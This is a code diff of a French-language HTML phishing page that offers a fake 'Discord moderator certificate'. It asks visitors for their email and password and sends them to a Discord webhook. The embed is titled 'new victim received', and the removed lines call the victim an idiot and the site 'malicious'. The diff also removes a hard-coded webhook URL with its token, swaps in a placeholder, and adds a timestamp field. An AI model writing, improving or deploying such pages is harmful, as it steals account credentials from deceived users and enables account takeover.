@@ -2,11 +2,11 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Certification de compte modérateur discord</title>
+  <title>Certificat de modérateur discord</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #3b357f;
+      background: #2c2f33;
       color: white;
       display: flex;
       justify-content: center;
@@ -25,7 +25,7 @@
     button {
       padding: 10px 20px;
       font-size: 16px;
-      background-color: #2c2f33;
+      background-color: #5865F2;
       color: white;
       border: none;
       border-radius: 8px;
@@ -37,52 +37,59 @@
   </style>
 </head>
 <body>
-  <h2>💬 Fait toi certifier modérateur discord ! ps: LES CHATS C'EST LES MEILLEURS</h2>
-  <input type="text" id="pseudo" placeholder="Ton email...">
+  <h2>💬 fait toi un certificat modérateur discord ! ps: les chats c'est mieux que les chiens</h2>
+  <input type="email" id="email" placeholder="Ton email...">
   <input type="text" id="message" placeholder="Ton mot de passe...">
   <button id="sendBtn">Entrer</button>
 
   <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1430155105952600125/miSVSRG79JmwJUBifFY8ejhEFtI2mwEVZ3Wd9ix69nUob0LUVFJyrFbVzDGqowbyEYbC";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/XXX/YYY";
 
     document.getElementById("sendBtn").addEventListener("click", async () => {
-      const pseudo = document.getElementById("pseudo").value.trim();
+      const email = document.getElementById("email").value.trim();
       const message = document.getElementById("message").value.trim();
 
-      if (!pseudo || !message) {
-        alert("Merci de remplir ton email et ton mot de passe !");
+      if (!email || !message) {
+        alert("Merci de remplir ton email et ton mot de passe discord !");
         return;
       }
+
+      // Récupérer la date et l'heure complètes
+      const now = new Date();
+      const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+      const date = now.toLocaleDateString('fr-FR', options);
+      const time = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
       const payload = {
         embeds: [
           {
-            title: "📩 Nouvelle victime BAHAHHAHA reçu",
+            title: "📩 Nouvelle victime reçu",
             color: 0x5865f2,
             fields: [
-              { name: "👤 email du con", value: pseudo, inline: true },
-              { name: "🔒 Mot de passe du con", value: message, inline: false }
+              { name: "📧 Email", value: email, inline: true },
+              { name: "🔒 Mot de passe", value: message, inline: false },
+              { name: "🕒 Date & Heure", value: `${date} à ${time}`, inline: false }
             ],
-            footer: { text: "Message envoyé depuis mon site malicieux 💻" }
+            footer: { text: "Message envoyé depuis mon site bahaha 💻" }
           }
         ]
       };
 
-      await fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
 
-      alert("compte créer avec sucées !");
-      document.getElementById("pseudo").value = "";
-      document.getElementById("message").value = "";
+        alert("Message envoyé sur Discord !");
+        document.getElementById("email").value = "";
+        document.getElementById("message").value = "";
+      } catch (err) {
+        alert("Erreur lors de l'envoi du certificat !");
+        console.error(err);
+      }
     });
   </script>
 </body>
-
 </html>
-
-
-
-
